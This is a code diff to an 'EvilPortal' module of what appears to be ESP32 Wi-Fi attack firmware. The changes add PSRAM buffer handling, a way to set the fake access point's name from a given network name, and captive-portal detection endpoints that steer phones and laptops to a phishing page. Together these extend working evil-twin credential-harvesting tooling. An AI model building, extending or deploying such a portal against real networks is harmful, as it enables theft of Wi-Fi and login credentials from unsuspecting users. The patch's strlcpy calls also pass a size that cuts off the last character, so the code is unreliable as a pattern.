@@ -1,5 +1,9 @@
 #include "EvilPortal.h"
 
+#ifdef HAS_PSRAM
+  char* index_html = nullptr;
+#endif
+
 AsyncWebServer server(80);
 
 EvilPortal::EvilPortal() {
@@ -23,9 +27,20 @@ void EvilPortal::setup() {
   #endif
 }
 
+void EvilPortal::cleanup() {
+  this->ap_index = -1;
+
+  #ifdef HAS_PSRAM
+    free(index_html);
+    index_html = nullptr;
+  #endif
+}
+
 bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
-  if (!this->setAP(ssids, access_points))
-    return false;
+  if (!this->has_ap) {
+    if (!this->setAP(ssids, access_points))
+      return false;
+  }
   if (!this->setHtml())
     return false;
     
@@ -43,12 +58,50 @@ String EvilPortal::get_password() {
 }
 
 void EvilPortal::setupServer() {
-  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", index_html);
-    Serial.println("client connected");
-    #ifdef HAS_SCREEN
-      this->sendToDisplay("Client connected to server");
+  #ifndef HAS_PSRAM
+    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
+      request->send_P(200, "text/html", index_html);
+      Serial.println("client connected");
+      #ifdef HAS_SCREEN
+        this->sendToDisplay("Client connected to server");
+      #endif
+    });
+  #else
+    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
+      request->send(200, "text/html", index_html);
+      Serial.println("client connected");
+      #ifdef HAS_SCREEN
+        this->sendToDisplay("Client connected to server");
+      #endif
+    });
+  #endif
+
+  const char* captiveEndpoints[] = {
+    "/hotspot-detect.html",
+    "/library/test/success.html",
+    "/success.txt",
+    "/generate_204",
+    "/gen_204",
+    "/ncsi.txt",
+    "/connecttest.txt",
+    "/redirect"
+  };
+
+  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
+    
+    #ifndef HAS_PSRAM
+      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+        request->send_P(200, "text/html", index_html);
+      });
+    #else
+      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+        request->send(200, "text/html", index_html);
+      });
     #endif
+  }
+
+  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
+    request->send(200, "text/plain", WiFi.softAPSSID());
   });
 
   server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -72,13 +125,18 @@ void EvilPortal::setupServer() {
       200, "text/html",
       "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
   });
-  Serial.println("web server up");
 }
 
 void EvilPortal::setHtmlFromSerial() {
   Serial.println("Setting HTML from serial...");
   const char *htmlStr = Serial.readString().c_str();
-  strncpy(index_html, htmlStr, strlen(htmlStr));
+  #ifdef HAS_PSRAM
+    index_html = (char*) ps_malloc(MAX_HTML_SIZE);
+  #endif
+  strlcpy(index_html, htmlStr, strlen(htmlStr));
+  #ifdef HAS_PSRAM
+    index_html[MAX_HTML_SIZE - 1] = '\0';
+  #endif
   this->has_html = true;
   this->using_serial_html = true;
   Serial.println("html set");
@@ -119,7 +177,13 @@ bool EvilPortal::setHtml() {
       if (isPrintable(c))
         html.concat(c);
     }
-    strncpy(index_html, html.c_str(), strlen(html.c_str()));
+    #ifdef HAS_PSRAM
+      index_html = (char*) ps_malloc(MAX_HTML_SIZE);
+    #endif
+    strlcpy(index_html, html.c_str(), strlen(html.c_str()));
+    #ifdef HAS_PSRAM
+      index_html[MAX_HTML_SIZE - 1] = '\0';
+    #endif
     this->has_html = true;
     Serial.println("html set");
     html_file.close();
@@ -130,11 +194,13 @@ bool EvilPortal::setHtml() {
 
 bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
   // See if there are selected APs first
+  int targ_ap_index = -1;
   String ap_config = "";
   String temp_ap_name = "";
   for (int i = 0; i < access_points->size(); i++) {
     if (access_points->get(i).selected) {
       temp_ap_name = access_points->get(i).essid;
+      targ_ap_index = i;
       break;
     }
   }
@@ -232,11 +298,26 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
     strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
     this->has_ap = true;
     Serial.println("ap config set");
+    this->ap_index = targ_ap_index;
     return true;
   }
   else
     return false;
 
+}
+
+bool EvilPortal::setAP(String essid) {
+  if (essid == "")
+    return false;
+
+  if (essid.length() > MAX_AP_NAME_SIZE) {
+    return false;
+  }
+
+  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
+  this->has_ap = true;
+  Serial.println("ap config set");
+  return true;
 }
 
 void EvilPortal::startAP() {
@@ -258,9 +339,14 @@ void EvilPortal::startAP() {
 
   this->setupServer();
 
+  Serial.println("Server endpoints configured");
+
   this->dnsServer.start(53, "*", WiFi.softAPIP());
+  Serial.println("DNS Server started");
   server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
+  Serial.println("Captive Portal handler started");
   server.begin();
+  Serial.println("Server started");
   #ifdef HAS_SCREEN
     this->sendToDisplay("Evil Portal READY");
   #endif
